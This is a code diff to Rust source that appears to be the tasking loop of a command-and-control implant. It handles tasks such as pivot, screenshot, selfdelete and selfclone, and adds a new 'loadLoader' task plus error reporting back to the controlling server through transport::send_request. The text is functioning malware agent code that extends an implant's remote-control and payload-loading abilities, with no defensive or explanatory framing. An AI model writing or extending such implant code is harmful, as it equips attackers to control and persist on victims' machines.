@@ -14,6 +14,7 @@ use crate::features::pivot;
 use crate::features::screenshot;
 use crate::features::selfdelete;
 use crate::features::selfclone;
+use crate::features::loadLoader;
 
 pub fn getTasking() -> Result<(), Box<dyn std::error::Error>> {
     let checkin_data = serde_json::json!({
@@ -30,6 +31,13 @@ pub fn getTasking() -> Result<(), Box<dyn std::error::Error>> {
         }
         if let Err(e) = handleTask(task) {
             eprintln!("[TASK] Error handling task: {:?}", e);
+            if let Some(task_id) = task.get("id").and_then(|v| v.as_str()) {
+                let err_resp = serde_json::json!({
+                    "action": "post_response",
+                    "responses": [{"task_id": task_id, "user_output": format!("Error: {}", e), "status": "error", "completed": true}]
+                }).to_string();
+                let _ = transport::send_request(&err_resp);
+            }
         }
     }
     if let Some(socks) = json.get("socks") {
@@ -112,6 +120,10 @@ pub fn handleTask(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
         }
         "selfclone" => {
             selfclone::selfclone(task)?;
+            return Ok(());
+        }
+        "loadLoader" => {
+            loadLoader::loadLoader(task)?;
             return Ok(());
         }
         _ => {
